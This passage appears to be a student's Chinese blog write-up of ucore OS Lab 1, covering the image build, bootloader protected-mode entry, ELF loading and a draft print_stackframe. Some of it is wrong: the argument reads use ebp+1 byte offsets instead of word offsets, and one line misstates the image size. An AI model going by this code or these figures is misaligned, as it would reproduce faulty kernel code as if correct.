|</span><br><span class="line">|	| 使用sign工具处理bootblock.out，生成bootblock</span><br><span class="line">|	| <span class="built_in">bin</span>/sign obj/bootblock.out <span class="built_in">bin</span>/bootblock</span><br><span class="line">|</span><br><span class="line">|&gt;	<span class="built_in">bin</span>/kernel</span><br><span class="line">|	| 生成kernel的相关代码为</span><br><span class="line">|	| $(kernel): tools/kernel.ld</span><br><span class="line">|	| $(kernel): $(KOBJS)</span><br><span class="line">|	| 	@echo + ld $@</span><br><span class="line">|	| 	$(V)$(LD) $(LDFLAGS) -T tools/kernel.ld -o $@ $(KOBJS)</span><br><span class="line">|	| 	@$(OBJDUMP) -S $@ &gt; $(call asmfile,kernel)</span><br><span class="line">|	| 	@$(OBJDUMP) -t $@ | $(SED) <span class="string">&#x27;1,/SYMBOL TABLE/d; s/ .* / /; \</span></span><br><span class="line"><span class="string">|	| 		/^$$/d&#x27;</span> &gt; $(call symfile,kernel)</span><br><span class="line">|	| </span><br><span class="line">|	| 为了生成kernel，首先需要 kernel.ld init.o readline.o stdio.o kdebug.o</span><br><span class="line">|	|	kmonitor.o panic.o clock.o console.o intr.o picirq.o trap.o</span><br><span class="line">|	|	trapentry.o vectors.o pmm.o  printfmt.o string.o</span><br><span class="line">|	| kernel.ld已存在</span><br><span class="line">|	|</span><br><span class="line">|	|&gt;	obj/kern/*/*.o </span><br><span class="line">|	|	| 生成这些.o文件的相关makefile代码为</span><br><span class="line">|	|	| $(call add_files_cc,$(call listf_cc,$(KSRCDIR)),kernel,\</span><br><span class="line">|	|	|	$(KCFLAGS))</span><br><span class="line">|	|	| 这些.o生成方式和参数均类似，仅举init.o为例，其余不赘述</span><br><span class="line">|	|&gt;	obj/kern/init/init.o</span><br><span class="line">|	|	| 编译需要init.c</span><br><span class="line">|	|	| 实际命令为</span><br><span class="line">|	|	|	gcc -Ikern/init/ -fno-builtin -Wall -ggdb -m32 \</span><br><span class="line">|	|	|		-gstabs -nostdinc  -fno-stack-protector \</span><br><span class="line">|	|	|		-Ilibs/ -Ikern/debug/ -Ikern/driver/ \</span><br><span class="line">|	|	|		-Ikern/trap/ -Ikern/mm/ -c kern/init/init.c \</span><br><span class="line">|	|	|		-o obj/kern/init/init.o</span><br><span class="line">|	| </span><br><span class="line">|	| 生成kernel时，makefile的几条指令中有@前缀的都不必需</span><br><span class="line">|	| 必需的命令只有</span><br><span class="line">|	| ld -m    elf_i386 -nostdlib -T tools/kernel.ld -o <span class="built_in">bin</span>/kernel \</span><br><span class="line">|	| 	obj/kern/init/init.o obj/kern/libs/readline.o \</span><br><span class="line">|	| 	obj/kern/libs/stdio.o obj/kern/debug/kdebug.o \</span><br><span class="line">|	| 	obj/kern/debug/kmonitor.o obj/kern/debug/panic.o \</span><br><span class="line">|	| 	obj/kern/driver/clock.o obj/kern/driver/console.o \</span><br><span class="line">|	| 	obj/kern/driver/intr.o obj/kern/driver/picirq.o \</span><br><span class="line">|	| 	obj/kern/trap/trap.o obj/kern/trap/trapentry.o \</span><br><span class="line">|	| 	obj/kern/trap/vectors.o obj/kern/mm/pmm.o \</span><br><span class="line">|	| 	obj/libs/printfmt.o obj/libs/string.o</span><br><span class="line">|	| 其中新出现的关键参数为</span><br><span class="line">|	|	-T &lt;scriptfile&gt;  让连接器使用指定的脚本</span><br><span class="line">|</span><br><span class="line">| 生成一个有<span class="number">10000</span>个块的文件，每个块默认<span class="number">512</span>字节，用<span class="number">0</span>填充</span><br><span class="line">| dd <span class="keyword">if</span>=/dev/zero of=<span class="built_in">bin</span>/ucore.img count=<span class="number">10000</span></span><br><span class="line">|</span><br><span class="line">| 把bootblock中的内容写到第一个块</span><br><span class="line">| dd <span class="keyword">if</span>=<span class="built_in">bin</span>/bootblock of=<span class="built_in">bin</span>/ucore.img conv=notrunc</span><br><span class="line">|</span><br><span class="line">| 从第二个块开始写kernel中的内容</span><br><span class="line">| dd <span class="keyword">if</span>=<span class="built_in">bin</span>/kernel of=<span class="built_in">bin</span>/ucore.img seek=<span class="number">1</span> conv=notrunc</span><br></pre></td></tr></table></figure>
<p>简单分析一下其中的内容：</p>
<ul>
<li>dd：用指定大小的块拷贝一个文件，并在拷贝的同时进行指定的转换</li>
<li>if=文件名：输入文件名，缺省为标准输入，即指定源文件 &lt; if=input file &gt;</li>
<li>of=文件名：输出文件名，缺省为标准输出，即指定目的文件 &lt; of=output file &gt;</li>
<li>count=blocks：仅拷贝blocks个块，块大小等于ibs指定的字节数</li>
<li>conv=conversion：用指定的参数转换文件</li>
<li>conv=notrunc：不截短输出文件</li>
</ul>
<p>简述过程：</p>
<ul>
<li>由上描述可以看出，首先先创建一个大小为10000字节的块，然后再将bootblock，kernel拷贝过去，然而生成 ucore.img 需要先生成kernel和bootblock</li>
<li>Makefile通过一系列命令生成了bootblock和kernel这两个elf文件，之后通过dd命令将bootblock放到第一个sector，将kernel放到第二个sector开始的区域（可以明显看出bootblock就是引导区，kernel则是操作系统内核）</li>
<li>而在这之前还通过sign对bootblock进行了修饰，在512个字节的最后两个字节写入了0x55AA，作为引导区的标记</li>
</ul>
<h2 id="练习2-单步跟踪BIOS的执行"><a href="#练习2-单步跟踪BIOS的执行" class="headerlink" title="练习2 - 单步跟踪BIOS的执行"></a>练习2 - 单步跟踪BIOS的执行</h2><p>没什么好写的，make debug 后就可以“任意发挥”了</p>
<p>记得在 tools/gdbinit 结尾加上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b *<span class="number">0x7c00</span></span><br><span class="line">c</span><br><span class="line">x /<span class="number">10</span>i $pc</span><br></pre></td></tr></table></figure>
<p>这是为了方便 <strong>练习3</strong> 而做出的操作，因为程序会默认在“kern_init”处打断点，直接跳过了bootloader </p>
<h2 id="练习3-分析bootloader进入保护模式的过程"><a href="#练习3-分析bootloader进入保护模式的过程" class="headerlink" title="练习3 - 分析bootloader进入保护模式的过程"></a>练习3 - 分析bootloader进入保护模式的过程</h2><p><strong>打开A20门</strong></p>
<p>在PC及其兼容机的第20根地址线比较特殊，计算机系统中一般安排一个“门”控制该地址线是否有效，为了访问1M以上的存储单元，应该打开A20门，这种设置与实模式下只使用低端1M字节存储空间有关，与处理器是否工作在实方式还是保护方式无关（即是关掉A20，也可以进入保护模式）</p>
<p>注：在 8086 中有 20 根地址总线，通过 CS:IP 对的方式寻址，最大访问地址为 1MB </p>
<p>先执行一下指令，方便观察程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) layout <span class="keyword">asm</span></span><br></pre></td></tr></table></figure>
<p>首先清理环境：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">│B+&gt;<span class="number">0x7c00</span>      cli	<span class="comment">// 禁止中断发生</span></span><br><span class="line">│   <span class="number">0x7c01</span>      cld <span class="comment">// 将标志寄存器flag的方向标志位df清零                           </span></span><br><span class="line">│   <span class="number">0x7c02</span>      <span class="keyword">xor</span>    %eax,%eax <span class="comment">// 异或eax把其填充为&#x27;0&#x27;    </span></span><br><span class="line">│   <span class="number">0x7c04</span>      mov    %eax,%ds <span class="comment">// 置空ds               </span></span><br><span class="line">│   <span class="number">0x7c06</span>      mov    %eax,%es <span class="comment">// 置空es              </span></span><br><span class="line">│   <span class="number">0x7c08</span>      mov    %eax,%ss <span class="comment">// 置空ss          </span></span><br><span class="line">│   <span class="number">0x7c0a</span>      in     $<span class="number">0x64</span>,%al <span class="comment">// 从0x64端口读取一字节数据到AL</span></span><br></pre></td></tr></table></figure>
<p>开启A20：通过将键盘控制器上的A20线置于高电位，使全部32条地址线可用（可以访问4G的内存空间）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">seta20<span class="number">.1</span>:				<span class="comment">// 等待8042键盘控制器不忙</span></span><br><span class="line">│   <span class="number">0x7c0a</span>      in     $<span class="number">0x64</span>,%al</span><br><span class="line">│   <span class="number">0x7c0c</span>      test   $<span class="number">0x2</span>,%al </span><br><span class="line">│   <span class="number">0x7c0e</span>      jne    <span class="number">0x7c0a</span> </span><br><span class="line">│   <span class="number">0x7c10</span>      mov    $<span class="number">0xd1</span>,%al</span><br><span class="line">│   <span class="number">0x7c12</span>      out    %al,$<span class="number">0x64</span>   </span><br><span class="line">seta20<span class="number">.1</span>:				<span class="comment">// 等待8042键盘控制器不忙   </span></span><br><span class="line">│   <span class="number">0x7c14</span>      in     $<span class="number">0x64</span>,%al                 </span><br><span class="line">│   <span class="number">0x7c16</span>      test   $<span class="number">0x2</span>,%al            </span><br><span class="line">│   <span class="number">0x7c18</span>      jne    <span class="number">0x7c14</span>          </span><br><span class="line">│   <span class="number">0x7c1a</span>      mov    $<span class="number">0xdf</span>,%al <span class="comment">// 打开A20         </span></span><br><span class="line">│   <span class="number">0x7c1c</span>      out    %al,$<span class="number">0x60</span>      </span><br></pre></td></tr></table></figure>
<p><strong>初始化GDT表</strong></p>
<p>一个简单的GDT表和其描述符已经静态储存在引导区中，载入即可</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">│   <span class="number">0x7c1e</span>      lgdtl  (%esi) </span><br></pre></td></tr></table></figure>
<p><strong>进入保护模式</strong></p>
<p>通过将cr0寄存器PE位置1便开启了保护模式</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">│  &gt;<span class="number">0x7c23</span>      mov    %cr0,%eax <span class="comment">// cr0 to eax             </span></span><br><span class="line">│   <span class="number">0x7c26</span>      <span class="keyword">or</span>     $<span class="number">0x1</span>,%ax <span class="comment">// 或操作(PE位变为&#x27;1&#x27;)                 </span></span><br><span class="line">│   <span class="number">0x7c2a</span>      mov    %eax,%cr0 <span class="comment">// eax to cr0   </span></span><br></pre></td></tr></table></figure>
<p>设置段寄存器，并建立堆栈：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">│  &gt;<span class="number">0x7c32</span>      mov    $<span class="number">0x10</span>,%ax <span class="comment">// 段寄存器全部初始化为&#x27;0x10&#x27;        </span></span><br><span class="line">│   <span class="number">0x7c36</span>      mov    %eax,%ds                                               </span><br><span class="line">│   <span class="number">0x7c38</span>      mov    %eax,%es                                              </span><br><span class="line">│   <span class="number">0x7c3a</span>      mov    %eax,%fs                                            </span><br><span class="line">│   <span class="number">0x7c3c</span>      mov    %eax,%gs                                              </span><br><span class="line">│   <span class="number">0x7c3e</span>      mov    %eax,%ss                                             </span><br><span class="line">│   <span class="number">0x7c40</span>      mov    $<span class="number">0x0</span>,%ebp                                             </span><br><span class="line">│   <span class="number">0x7c45</span>      mov    $<span class="number">0x7c00</span>,%esp <span class="comment">// 设置0x7c00为栈顶  </span></span><br></pre></td></tr></table></figure>
<p>转到保护模式完成，进入boot主方法：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">│   <span class="number">0x7c4a</span>      call   <span class="number">0x7d0f</span> </span><br><span class="line">------------------------------------</span><br><span class="line">│  &gt;<span class="number">0x7d13</span>      push   %ebp                                                   │</span><br><span class="line">│   <span class="number">0x7d14</span>      <span class="keyword">xor</span>    %ecx,%ecx                                              │</span><br><span class="line">│   <span class="number">0x7d16</span>      mov    %esp,%ebp                                              │</span><br><span class="line">│   <span class="number">0x7d18</span>      mov    $<span class="number">0x1000</span>,%edx                                           │</span><br><span class="line">│   <span class="number">0x7d1d</span>      push   %esi                                                   │</span><br><span class="line">│   <span class="number">0x7d1e</span>      mov    $<span class="number">0x10000</span>,%eax                                          │</span><br><span class="line">│   <span class="number">0x7d23</span>      push   %ebx                                                   │</span><br><span class="line">│   <span class="number">0x7d24</span>      call   <span class="number">0x7c72</span>                                                 │</span><br><span class="line">│   <span class="number">0x7d29</span>      cmpl   $<span class="number">0x464c457f</span>,<span class="number">0x10000</span>                                    │</span><br><span class="line">│   <span class="number">0x7d33</span>      jne    <span class="number">0x7d74</span>    </span><br></pre></td></tr></table></figure>
<h2 id="练习4-分析bootloader加载ELF格式的OS的过程"><a href="#练习4-分析bootloader加载ELF格式的OS的过程" class="headerlink" title="练习4 - 分析bootloader加载ELF格式的OS的过程"></a>练习4 - 分析bootloader加载ELF格式的OS的过程</h2><p><code>readsect</code>：从设备的第secno扇区读取数据到dst位置</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">readsect</span><span class="params">(<span class="keyword">void</span> *dst, <span class="keyword">uint32_t</span> secno)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// wait for disk to be ready</span></span><br><span class="line">    waitdisk();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 把信息写入段号口</span></span><br><span class="line">    outb(<span class="number">0x1F2</span>, <span class="number">1</span>); <span class="comment">// count = 1(设置读取扇区的数目为1)</span></span><br><span class="line">    outb(<span class="number">0x1F3</span>, secno &amp; <span class="number">0xFF</span>);</span><br><span class="line">    outb(<span class="number">0x1F4</span>, (secno &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">    outb(<span class="number">0x1F5</span>, (secno &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">    outb(<span class="number">0x1F6</span>, ((secno &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xF</span>) | <span class="number">0xE0</span>);</span><br><span class="line">    outb(<span class="number">0x1F7</span>, <span class="number">0x20</span>); <span class="comment">// cmd 0x20 - read sectors(读取扇区)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// wait for disk to be ready</span></span><br><span class="line">    waitdisk();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// read a sector</span></span><br><span class="line">    insl(<span class="number">0x1F0</span>, dst, SECTSIZE / <span class="number">4</span>); <span class="comment">// 读取到dst位置(幻数4因为这里以DW为单位)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>readseg</code>：简单包装了 readsect，可以从设备读取任意长度的内容（指定了要读取的字节数）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">readseg</span><span class="params">(<span class="keyword">uintptr_t</span> va, <span class="keyword">uint32_t</span> count, <span class="keyword">uint32_t</span> offset)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uintptr_t</span> end_va = va + count;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 四舍五入到扇区边界</span></span><br><span class="line">    va -= offset % SECTSIZE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将字节转换为扇区，内核从&#x27;扇区1&#x27;开始</span></span><br><span class="line">    <span class="keyword">uint32_t</span> secno = (offset / SECTSIZE) + <span class="number">1</span>;</span><br><span class="line">	    <span class="comment">// +1:因为&#x27;0扇区&#x27;被引导占用,所以ELF文件从&#x27;1扇区&#x27;开始</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (; va &lt; end_va; va += SECTSIZE, secno ++) &#123;</span><br><span class="line">        readsect((<span class="keyword">void</span> *)va, secno); <span class="comment">// 每次读一个扇区</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>bootmain</code>函数中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">bootmain(<span class="keyword">void</span>) &#123;</span><br><span class="line">    <span class="comment">// 首先读取ELF的头部</span></span><br><span class="line">    readseg((<span class="keyword">uintptr_t</span>)ELFHDR, SECTSIZE * <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过储存在头部的幻数判断是否是合法的ELF文件</span></span><br><span class="line">    <span class="keyword">if</span> (ELFHDR-&gt;e_magic != ELF_MAGIC) &#123;</span><br><span class="line">        <span class="keyword">goto</span> bad;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proghdr</span> *<span class="title">ph</span>, *<span class="title">eph</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ELF头部有描述ELF文件应加载到内存什么位置的描述表，先将描述表的头地址存在ph</span></span><br><span class="line">    ph = (struct proghdr *)((<span class="keyword">uintptr_t</span>)ELFHDR + ELFHDR-&gt;e_phoff);</span><br><span class="line">    eph = ph + ELFHDR-&gt;e_phnum;</span><br><span class="line">    <span class="comment">// 按照描述表将ELF文件中数据载入内存</span></span><br><span class="line">    <span class="keyword">for</span> (; ph &lt; eph; ph ++) &#123;</span><br><span class="line">        readseg(ph-&gt;p_va &amp; <span class="number">0xFFFFFF</span>, ph-&gt;p_memsz, ph-&gt;p_offset);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ELF文件0x1000位置后面的0xd1ec比特被载入内存0x00100000</span></span><br><span class="line">    <span class="comment">// ELF文件0xf000位置后面的0x1d20比特被载入内存0x0010e000</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 根据ELF头部储存的入口信息，找到内核的入口</span></span><br><span class="line">    ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))(ELFHDR-&gt;e_entry &amp; <span class="number">0xFFFFFF</span>))();</span><br><span class="line"></span><br><span class="line">bad:</span><br><span class="line">    outw(<span class="number">0x8A00</span>, <span class="number">0x8A00</span>);</span><br><span class="line">    outw(<span class="number">0x8A00</span>, <span class="number">0x8E00</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* do nothing */</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="练习5-实现函数调用堆栈跟踪函数"><a href="#练习5-实现函数调用堆栈跟踪函数" class="headerlink" title="练习5 - 实现函数调用堆栈跟踪函数"></a>练习5 - 实现函数调用堆栈跟踪函数</h2><p>终于遇到一个需要写的练习了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_stackframe</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">     <span class="comment">/* LAB1 YOUR CODE : STEP 1 */</span></span><br><span class="line">     <span class="comment">/* (1) call read_ebp() to get the value of ebp. the type is (uint32_t);</span></span><br><span class="line"><span class="comment">      * (2) call read_eip() to get the value of eip. the type is (uint32_t);</span></span><br><span class="line"><span class="comment">      * (3) from 0 .. STACKFRAME_DEPTH</span></span><br><span class="line"><span class="comment">      *    (3.1) printf value of ebp, eip</span></span><br><span class="line"><span class="comment">      *    (3.2) (uint32_t)calling arguments [0..4] = the contents in address (uint32_t)ebp +2 [0..4]</span></span><br><span class="line"><span class="comment">      *    (3.3) cprintf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">      *    (3.4) call print_debuginfo(eip-1) to print the C calling function name and line number, etc.</span></span><br><span class="line"><span class="comment">      *    (3.5) popup a calling stackframe</span></span><br><span class="line"><span class="comment">      *           NOTICE: the calling funciton&#x27;s return addr eip  = ss:[ebp+4]</span></span><br><span class="line"><span class="comment">      *                   the calling funciton&#x27;s ebp = ss:[ebp]</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当然不是从零开始，程序已经写好了一些函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STACKFRAME_DEPTH 20</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __noinline <span class="keyword">uint32_t</span> <span class="title">read_eip</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> eip;</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">&quot;movl 4(%%ebp), %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (eip))</span></span>;</span><br><span class="line">    <span class="keyword">return</span> eip;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">uint32_t</span> <span class="title">read_ebp</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> ebp;</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(<span class="string">&quot;movl %%ebp, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (ebp))</span></span>;</span><br><span class="line">    <span class="keyword">return</span> ebp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_debuginfo</span><span class="params">(<span class="keyword">uintptr_t</span> eip)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">eipdebuginfo</span> <span class="title">info</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (debuginfo_eip(eip, &amp;info) != <span class="number">0</span>) &#123;</span><br><span class="line">        cprintf(<span class="string">&quot;    &lt;unknow&gt;: -- 0x%08x --\n&quot;</span>, eip);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">char</span> fnname[<span class="number">256</span>];</span><br><span class="line">        <span class="keyword">int</span> j;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; info.eip_fn_namelen; j ++) &#123;</span><br><span class="line">            fnname[j] = info.eip_fn_name[j];</span><br><span class="line">        &#125;</span><br><span class="line">        fnname[j] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        cprintf(<span class="string">&quot;    %s:%d: %s+%d\n&quot;</span>, info.eip_file, info.eip_line,</span><br><span class="line">                fnname, eip - info.eip_fn_addr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>翻译翻译实验想让我们干什么：</p>
<ul>
<li>打印 ebp eip 的地址</li>
<li>打印调用的参数</li>
<li>调用“print_debuginfo（eip-1）”打印C调用函数名和行号等</li>
<li>弹出一个调用堆栈帧（按照提示做）</li>
</ul>
<p>首次进行尝试：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_stackframe</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> ebp = read_ebp();</span><br><span class="line">    <span class="keyword">size_t</span> eip = read_eip();</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 这里一定要使用&quot;cprintf&quot;，原版&quot;printf&quot;直接报错</span></span><br><span class="line">    cprintf(<span class="string">&quot;ebp:0x%08x eip:0x%08x&quot;</span>,ebp,eip); </span><br><span class="line">    cprintf(<span class="string">&quot;args:0x%08x\n&quot;</span>,*(<span class="keyword">size_t</span>*)(ebp+<span class="number">1</span>)); <span class="comment">// 写在一起不好看</span></span><br><span class="line">    cprintf(<span class="string">&quot;args:0x%08x\n&quot;</span>,*(<span class="keyword">size_t</span>*)(ebp+<span class="number">2</span>));</span><br><span class="line">    cprintf(<span class="string">&quot;args:0x%08x\n&quot;</span>,*(<span class="keyword">size_t</span>*)(ebp+<span class="number">3</span>));</span><br><span class="line">    cprintf(<span class="string">&quot;args:0x%08x\n&quot;</span>,*(<span class="keyword">size_t</span>*)(ebp+<span class="number">4</span>));</span><br><span class="line">    </span><br><span class="line">    cprintf(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    print_debuginfo(eip - <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    eip = *(<span class="keyword">size_t</span>*)(ebp + <span class="number">1</span>);</span><br><span class="line">    ebp = *(<span class="keyword">size_t</span>*)(ebp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>回头看答案发现我少了一个循环，后来发现这是要求的一部分，另外，“read_ebp”和“read_eip”的返回参数类型是“uint32_t”，还是改为“uint32_t”比较好</p>
<p>再次尝试：（部分地方进行了修改）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_stackframe</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> ebp = read_ebp();</span><br><span class="line">    <span class="keyword">uint32_t</span> eip = read_eip();</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; ebp != <span class="number">0</span> &amp;&amp; i &lt; STACKFRAME_DEPTH; i ++) &#123;</span><br><span class="line">        cprintf(<span class="string">&quot;ebp:0x%08x eip:0x%08x\n&quot;</span>,ebp,eip); </span><br><span class="line">        cprintf(<span class="string">&quot;args_1:0x%08x\n&quot;</span>,*(<span class="keyword">uint32_t</span>*)(ebp+<span class="number">1</span>));</span><br><span class="line">        cprintf(<span class="string">&quot;args_2:0x%08x\n&quot;</span>,*(<span class="keyword">uint32_t</span>*)(ebp+<span class="number">2</span>));</span><br><span class="line">        cprintf(<span class="string">&quot;args_3:0x%08x\n&quot;</span>,*(<span class="keyword">uint32_t</span>*)(ebp+<span class="number">3</span>));</span><br><span class="line">        cprintf(<span class="string">&quot;args_4:0x%08x\n&quot;</span>,*(<span 